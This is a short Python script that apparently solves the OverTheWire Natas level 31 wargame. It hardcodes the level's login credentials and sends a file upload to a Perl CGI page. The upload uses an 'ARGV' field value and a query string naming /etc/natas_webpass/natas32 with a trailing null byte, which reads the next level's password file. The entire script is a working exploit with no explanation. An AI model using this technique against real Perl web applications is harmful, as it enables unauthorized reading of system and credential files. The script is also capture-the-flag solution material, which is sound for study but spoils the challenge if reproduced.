import sys
import requests as req

username = "natas31"
password = "AMZF14yknOn9Uc57uKB02jnYuhplYka3"
url = "http://%s.natas.labs.overthewire.org/" % username
url += "index.pl?/etc/natas_webpass/natas32\0"

s = req.session()

def get(s):
	r = s.get(url, auth=(username, password))
	return r

def post(s, data):
	r = s.post(url, auth=(username, password), data=data)
	return r

def upload(s, files, data):
	r = s.post(url, auth=(username, password), files=files, data=data)
	return r

if __name__ == "__main__":
	data = {"file": "ARGV"}
	files = {"file": open("test.txt", "rb")}
	r = upload(s, files, data)
	print(r.text)
	print(r.request.body)
